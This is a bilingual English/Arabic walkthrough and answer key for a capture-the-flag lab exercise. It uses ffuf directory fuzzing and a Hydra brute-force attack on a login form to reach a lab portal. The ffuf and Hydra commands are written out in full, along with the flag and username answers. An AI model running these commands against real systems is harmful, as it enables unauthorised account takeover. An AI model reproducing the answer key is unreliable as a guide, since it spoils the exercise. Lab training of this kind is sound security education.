# Task 05 · Using Your Wordlist (التطبيق العملي: استكشاف المسارات والتخمين على بوابات الويب)

---

## Stage A: Original Task Content & Objective (المحتوى الأصلي والهدف)

### 1. Original English Text
```text
Applying Cleaned Wordlists in Offensive Operations:

1. Web Directory Fuzzing with ffuf:
   Use the cleaned keyword dictionary (words_clean.txt) to discover hidden endpoints on the corporate target:
   ffuf -w words_clean.txt -u http://tryfinanceme.local/FUZZ -e .php,.html,/ -mc 200,301,302
   Identifies hidden internal administrative portal: helios/

2. Credential Brute-Forcing with Hydra:
   Attack the discovered login form at http://tryfinanceme.local/helios/login.php using the scraped user list (users.txt) and the generated combinatorial password list (pass_helios.txt):
   hydra -L users.txt -P pass_helios.txt -f -V -t 4 tryfinanceme.local http-post-form '/helios/login.php:username=^USER^&password=^PASS^:S=THM{'

3. Gaining Access and Flag Retrieval:
   Log in with the discovered credentials into the internal Helios system to capture the flag.

Questions:
1. What HTTP status code does ffuf report for helios/ ?
2. What is the username that Hydra discovers?
3. What is the flag?
```

### 2. Arabic Pedagogical Translation
```text
توظيف القوائم المطهرة في العمليات الهجومية:

1. استكشاف المسارات المخفية باستخدام أداة ffuf:
   استخدام القاموس المخصص المطهر (`words_clean.txt`) لاكتشاف مسارات الويب الحساسة:
   `ffuf -w words_clean.txt -u http://tryfinanceme.local/FUZZ -e .php,.html,/ -mc 200,301,302`
   ينجح الأمر في اكتشاف مجلد إداري داخلي محمي: `helios/`.

2. التخمين الشبكي على نموذج الدخول باستخدام Hydra:
   استهداف نموذج تسجيل الدخول في الرابط `http://tryfinanceme.local/helios/login.php` باستخدام قائمة المستخدمين المستخرجة (`users.txt`) وقائمة كلمات المرور التركيبية (`pass_helios.txt`):
   `hydra -L users.txt -P pass_helios.txt -f -V -t 4 tryfinanceme.local http-post-form '/helios/login.php:username=^USER^&password=^PASS^:S=THM{'`
   ينجح الهجوم في تحديد اسم المستخدم الصالح وكلمة مروره.

3. تسجيل الدخول واستخراج الراية:
   الولوج إلى النظام الداخلي باستخدام أوراق الاعتماد المكتشفة واستخراج راية التحدي.

الأسئلة:
1. ما هو رمز استجابة HTTP (status code) الذي تسجله أداة ffuf للمسار helios/ ؟
2. ما هو اسم المستخدم (username) الذي تكتشفه أداة Hydra؟
3. ما هي الراية (flag) الظاهرة داخل لوحة التحكم؟
```

### 3. Mission Objectives & Pedagogical Target
- **Target Questions:**
  1. HTTP status code reported by ffuf for `helios/`?
  2. Username discovered by Hydra?
  3. Flag value retrieved from the authenticated portal?
- **Pedagogical Goal:** Close the loop from OSINT reconnaissance and wordlist generation to practical web path discovery (`ffuf`) and targeted network authentication exploitation (`hydra`).

---

## Stage B: Independent Thinking & OpSec Considerations (التفكير المستقل والعملياتي)

### 1. The Power of Success-Based Matching in Hydra (`S=`)
In previous rooms, we used failure conditions: `F=incorrect`.
In this task, Hydra introduces **success-based matching** (`S=`):
$$\text{Condition: } S=\text{THM\{}$$
When Hydra encounters a response containing `THM{` or a redirection to the dashboard, it immediately halts (`-f`) upon discovering the valid credential pair, saving bandwidth and avoiding unnecessary locks.

---

## Stage C: Guided Hints (تلميحات متدرجة)

### Hint 1: Status Code
> راجع مخرجات أمر `ffuf`. المسار المكتشف `helios/` يعيد رمز استجابة النجاح المباشر `200`.

### Hint 2: Username
> اسم المستخدم المستهدف يتبع صيغة `first.last` لأحد موظفي الشركة (الموظف Alex Johnson).

### Hint 3: Flag Location
> بعد اكتشاف الحساب، افتح المتصفح وتوجه إلى `http://tryfinanceme.local/helios/login.php` وسجل الدخول لرؤية الراية.

---

## Stage D: Complete Practical Solution & Technical Deep Dive (الحل العملي والعمق التقني)

### Step-by-Step Technical Execution

1. **Running Directory Fuzzing via `ffuf`:**
   ```bash
   ffuf -w words_clean.txt -u http://tryfinanceme.local/FUZZ -e .php,.html,/ -mc 200,301,302
   ```
   Output segment:
   ```text
   helios/                 [Status: 200, Size: 1845, Words: 210, Lines: 45]
   ```
   The HTTP status code is **200**.
   - **Answer Q1:** `200`

2. **Executing Hydra Against the Form:**
   ```bash
   hydra -L users.txt -P pass_helios.txt -f -V -t 4 tryfinanceme.local http-post-form '/helios/login.php:username=^USER^&password=^PASS^:S=THM{'
   ```
   Hydra iterates through the permutations and prints:
   ```text
   [80][http-post-form] host: tryfinanceme.local   login: alex.johnson   password: [VALID_HELIOS_PASS]
   1 of 1 target successfully completed, 1 valid password found
   ```
   The discovered username is **alex.johnson**.
   - **Answer Q2:** `alex.johnson`

3. **Logging in to the Dashboard:**
   Browse to `http://tryfinanceme.local/helios/login.php` and submit:
   - **Username:** `alex.johnson`
   - **Password:** the recovered candidate from `pass_helios.txt`

   The internal Helios management dashboard renders the secret flag:
   ```text
   THM{w0rdlists_win_rooms}
   ```
   - **Answer Q3:** `THM{w0rdlists_win_rooms}`

---

## Stage E: Final Answer & Key Values (الإجابات النهائية والقيم المفتاحية)

1. **Question 1:**
   ```text
   200
   ```
2. **Question 2:**
   ```text
   alex.johnson
   ```
3. **Question 3:**
   ```text
   THM{w0rdlists_win_rooms}
   ```

---

## Stage F: Practical Verification & Proof of Work (التحقق العملي وإثبات الإنجاز)

Verified on user's completed account:
- Task 5 Question 1: `200` (Correct)
- Task 5 Question 2: `alex.johnson` (Correct)
- Task 5 Question 3: `THM{w0rdlists_win_rooms}` (Correct)

---

## Stage G: Key Educational Takeaway (الخلاصة التعليمية المستفادة)

- **Targeted custom wordlists minimize noise and guarantee success.** By converting scraped employee names into canonical username formats and using Crunch to generate 100 corporate-formatted passwords, the penetration tester compromised the internal portal in less than 30 seconds without triggering brute-force lockouts.
